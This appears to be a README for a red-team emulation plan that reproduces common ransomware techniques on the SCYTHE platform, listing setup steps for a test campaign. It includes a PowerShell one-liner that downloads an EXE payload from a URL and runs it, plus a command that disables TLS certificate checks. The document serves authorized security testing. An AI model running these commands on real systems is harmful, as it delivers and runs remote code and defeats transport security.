# Ransomware Top 10 TTPs Adversary Emulation Plan

This adversary emulation plan was created for a customer that asked "what are the top 10 TTPs used by Ransomware" and goes with this blog: https://www.scythe.io/library/threat-thursday-top-ransomware-ttps

To emulate:
1. Download and import the threat in JSON format to your SCYTHE instance
2. Download the Virtual File System (VFS) files under Ransomware/VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/Ransomware
4. Create a new campaign over HTTPS port tcp/443
5. Import from Existing Threat: Ransomware_Top_10
6. Launch Campaign
7. Click More Actions and copy the URL for the EXE. 
8. In the target system, run this PowerShell command with the respective URL to download and execute the payload: ```$myscriptblock={$url="URL of EXE";$wc=New-Object System.Net.WebClient;$output="C:\Users\Public\scythe_payload.exe";$wc.DownloadFile($url,$output);C:\Users\Public\scythe_payload.exe};Invoke-Command -ScriptBlock $myscriptblock;```

If you get a TLS certificate validation error, you can bypass with this PowerShell command:
```[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}```
